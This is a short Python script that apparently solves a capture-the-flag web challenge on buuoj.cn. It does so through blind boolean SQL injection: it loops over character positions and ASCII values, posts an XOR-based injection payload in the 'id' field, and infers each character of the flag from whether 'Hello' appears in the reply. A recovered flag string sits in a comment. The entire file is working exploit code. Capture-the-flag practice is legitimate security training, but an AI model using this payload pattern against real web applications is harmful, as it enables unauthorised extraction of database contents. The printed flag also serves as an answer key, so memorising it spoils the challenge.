import requests

url = "http://web43.buuoj.cn/index.php"

payload = "1^(ascii(mid((select(flag)from(flag)),{},1))={})"


def main():
	flag = ''
	for i in range(1, 50):
		for j in range(0,127):
			sql = payload.format(i,j)
			#print sql
			r = requests.post(url,data={'id':sql})
			if 'Hello' not in r.text:
				flag += chr(j)
				print flag
				break
#flag{5yk358dl6me5exxwo4mo2hjs5w0h&!!!}
if __name__ == '__main__':
	main()